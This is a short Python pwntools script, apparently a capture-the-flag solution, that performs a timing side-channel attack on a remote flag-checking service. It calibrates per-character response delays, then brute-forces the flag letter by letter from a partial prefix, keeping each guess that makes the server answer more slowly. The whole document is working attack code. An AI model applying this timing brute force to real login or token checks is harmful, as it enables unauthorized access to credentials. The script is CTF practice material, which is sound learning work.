from pwn import *
import time
import string
context.log_level = 'WARNING'
kek = string.ascii_letters
flag = "HZVIII{Prot3ct_Y0ur_$3rver_"
#### this is a test

##
p = remote("50i9k97k4puypj7bvtngr2yco.ctf.p0wnhub.com",52400)
p.recvuntil('FLAG:')
t = time.time()
p.sendline("H")
p.recvuntil("FLAG: ")
res = time.time() - t
print res
p.close()


##
p = remote("50i9k97k4puypj7bvtngr2yco.ctf.p0wnhub.com",52400)
p.recvuntil('FLAG:')
t = time.time()
p.sendline("HZ")
p.recvuntil("FLAG: ")
res2 = time.time() - t - res
print res2
p.close()



#### brute force process
print "start bruteforce"
for _ in range(47):
    for i in kek:
        x = flag + i
        print x
        p = remote("50i9k97k4puypj7bvtngr2yco.ctf.p0wnhub.com",52400)
        p.recvuntil('FLAG:')
        t = time.time()
        p.sendline(x)
        p.recvuntil("FLAG: ")
        res3 = time.time() - t
        if res3 > res+(res2*len(flag))-0.1:
            flag += i
            print "YES"
            print flag
            break
        else:
            print "NO"
        p.close()
    #print flag